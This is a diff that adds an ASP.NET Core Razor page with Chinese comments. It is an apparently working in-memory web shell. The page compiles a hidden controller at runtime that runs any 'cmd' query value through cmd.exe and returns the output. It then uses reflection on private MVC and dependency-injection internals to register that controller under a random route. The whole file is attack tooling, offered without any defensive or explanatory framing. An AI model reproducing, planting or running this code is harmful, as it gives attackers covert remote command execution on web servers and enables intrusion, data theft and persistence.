@@ -1,0 +1,111 @@
+﻿@using System.Reflection.Emit
+@using System.Reflection
+@using System.Text
+@using Microsoft.AspNetCore.Http;
+@using Microsoft.Extensions.FileProviders
+@using Microsoft.Extensions.Primitives
+@using System;
+@using System.IO;
+@using System.Text
+@using Microsoft.CodeAnalysis.CSharp
+@using Microsoft.Extensions.DependencyInjection;
+@using Microsoft.CodeAnalysis
+@functions {
+	public Assembly Compile(string text)
+	{
+		Assembly.Load(new AssemblyName("System.Diagnostics.Process"));
+		var appDomain = AppDomain.CurrentDomain;
+		var assemblies = appDomain.GetAssemblies()
+			.Where(a => !a.IsDynamic && !string.IsNullOrEmpty(a.Location)) // 检查路径是否为空
+			.Select(a => a.Location)
+			.ToList();
+		var references = assemblies
+			.Select(location => Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(location, default, null))
+			.Cast<MetadataReference>()
+			.ToList();
+		var options = new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary);
+		var assemblyName = "_" + Guid.NewGuid().ToString("D");
+		var syntaxTrees = new SyntaxTree[] { CSharpSyntaxTree.ParseText(text) };
+		var compilation = CSharpCompilation.Create(assemblyName, syntaxTrees, references, options);
+		using var stream = new MemoryStream();
+		var compilationResult = compilation.Emit(stream);
+		if (compilationResult.Success)
+		{
+			stream.Seek(0, SeekOrigin.Begin);
+			return Assembly.Load(stream.ToArray());
+		}
+
+		throw new InvalidOperationException("Compilation error");
+	}
+}
+
+@{
+    string action_name = "_" + Guid.NewGuid().ToString("D").Replace("-", "");
+    string controller_name = "_" + Guid.NewGuid().ToString("D").Replace("-", "");
+    string sourceCode = @"
+    using System.Diagnostics;
+	using Microsoft.AspNetCore.Mvc;
+	using Microsoft.AspNetCore.Http;
+	public class %controller_name%Controller: Controller
+	{
+		public void %action_name%()
+		{
+			if (HttpContext.Request.Query.ContainsKey(""cmd"") && !string.IsNullOrEmpty(HttpContext.Request.Query[""cmd""])) 
+			{
+				string txt = HttpContext.Request.Query[""cmd""];
+				System.Diagnostics.Process p = new System.Diagnostics.Process();
+				p.StartInfo.FileName = ""cmd.exe""; // Windows改为cmd.exe
+				p.StartInfo.Arguments = ""/c "" + txt; // windows改为""""/c """"
+				p.StartInfo.UseShellExecute = false;
+				p.StartInfo.RedirectStandardOutput = true;
+				p.StartInfo.RedirectStandardError = true;
+				p.Start();
+				var content = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+				HttpContext.Response.Body.WriteAsync(System.Text.Encoding.UTF8.GetBytes(txt + ""\n""));
+				HttpContext.Response.Body.WriteAsync(System.Text.Encoding.UTF8.GetBytes(content));
+			}
+		}
+
+	}
+    ".Replace("%action_name%", action_name).Replace("%controller_name%", controller_name);
+
+    var assemblyShell = Compile(sourceCode);
+    var iActionDescriptorProviderList = (Microsoft.AspNetCore.Mvc.Abstractions.IActionDescriptorProvider[])this.Context.RequestServices.GetService(typeof(IEnumerable<>).MakeGenericType(typeof(Microsoft.AspNetCore.Mvc.Abstractions.IActionDescriptorProvider)));
+    var actionDescriptorProvider = iActionDescriptorProviderList.FirstOrDefault(m => m.GetType().FullName.Equals("Microsoft.AspNetCore.Mvc.ApplicationModels.ControllerActionDescriptorProvider"));
+    var partManager = actionDescriptorProvider.GetType().GetField("_partManager", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(actionDescriptorProvider);
+    var applicationParts = (List<Microsoft.AspNetCore.Mvc.ApplicationParts.ApplicationPart>)partManager.GetType().GetProperty("ApplicationParts").GetValue(partManager);
+    var assemblyPartType = typeof(Microsoft.AspNetCore.Mvc.ApplicationParts.AssemblyPart);
+    var assemblyPart = (Microsoft.AspNetCore.Mvc.ApplicationParts.AssemblyPart) Activator.CreateInstance(assemblyPartType, assemblyShell);
+    applicationParts.Add(assemblyPart); // 添加到ApplicationParts
+
+    this.Context.RequestServices.GetService(typeof(Microsoft.AspNetCore.Mvc.Infrastructure.IActionDescriptorCollectionProvider)).GetType().GetMethod("UpdateCollection", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(this.Context.RequestServices.GetService(typeof(Microsoft.AspNetCore.Mvc.Infrastructure.IActionDescriptorCollectionProvider)), null);
+    
+    var requestServices = this.Context.RequestServices;
+    // 程序集中定义的Controller
+    Type controllerType =assemblyShell.DefinedTypes.FirstOrDefault(t => t.FullName.Contains("Controller"));
+    // 获取 ServiceIdentifier 类型
+    Type serviceIdentifierType = requestServices.GetType().Assembly.DefinedTypes.ToArray().FirstOrDefault(m => m.FullName.Equals("Microsoft.Extensions.DependencyInjection.ServiceLookup.ServiceIdentifier"));
+    var fromServiceTypeMethod = serviceIdentifierType.GetMethod("FromServiceType");
+    var rootProvider = requestServices.GetType().GetProperty("RootProvider", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(requestServices);
+    // ServicesAccessor集合
+    var serviceAccessors = rootProvider.GetType().GetField("_serviceAccessors", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(rootProvider);
+    var tryAddMethod = serviceAccessors.GetType().GetMethod("TryAdd");
+    // new ServiceIdentifier
+    var _controllerServiceIdentifierType = fromServiceTypeMethod.Invoke(null, new object[] { controllerType });
+    Type serviceAccessorType = requestServices.GetType().Assembly.DefinedTypes.ToArray()
+        .FirstOrDefault(m => m.FullName.Equals("Microsoft.Extensions.DependencyInjection.ServiceProvider"))
+        .GetNestedTypes(BindingFlags.NonPublic).FirstOrDefault(m => m.FullName.Contains("ServiceProvider+ServiceAccessor"));
+    // 自定义 ServicesAccessor 返回服务实例的行为
+    // Func<object?, object?> func = _ => Activator.CreateInstance(controllerType);
+    Func<object?, object?> func = _ =>
+    {
+	    return controllerType.GetConstructors().FirstOrDefault().Invoke(null);
+    };
+    // 创建自定义 ServicesAccessor
+    var serviceAccessor = Activator.CreateInstance(serviceAccessorType);
+    serviceAccessorType.GetProperty("RealizedService").SetValue(serviceAccessor, func);
+    // 添加自定义 ServicesAccessor
+    tryAddMethod.Invoke(serviceAccessors,  new object[]{_controllerServiceIdentifierType, serviceAccessor});
+    
+    this.Context.Response.WriteAsync("/" + controller_name + "/" + action_name);
+}
